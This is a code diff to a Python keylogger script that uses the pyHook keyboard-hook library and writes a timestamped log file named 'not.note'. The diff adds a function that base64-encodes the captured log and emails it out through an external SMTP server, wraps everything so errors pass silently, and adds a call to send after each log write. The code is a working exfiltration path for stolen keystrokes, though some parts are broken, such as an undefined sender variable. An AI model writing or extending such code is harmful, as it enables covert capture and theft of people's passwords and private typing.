@@ -1,14 +1,32 @@
 # -*- coding: utf-8 -*-
 
 import os
+import smtplib
+import base64
 import pythoncom, pyHook
 from datetime import datetime
 
+def send():
+    subj = 'User\'s report {}'.format(str(datetime.now()).split('.')[0])
+    to = ''
+    data = base64.b64encode(open('not.note', 'r+').read())
+    body = '\r\n'.join((
+        'From: %s' % user,
+        'To: %s' % to,
+        'Subject: %s' % subj,
+        '',
+        'Hello, sir!\nHere is a text log\n\n{}\n\nGood luck!'.format(data)
+    ))
+    server = smtplib.SMTP('smtp.mail.com:25')
+    server.login(user='', pwd='')
+    server.sendmail(user, [to], body)
+    server.close()
 
 try:
     with open('not.note', 'a') as f:
         f.write('\n{0:-<22}\n[ {1} ]\n{0:-<22}\n'.format('-', str(datetime.now()).split('.')[0]))
         f.close()
+    send()
 
 except Exception:
     pass
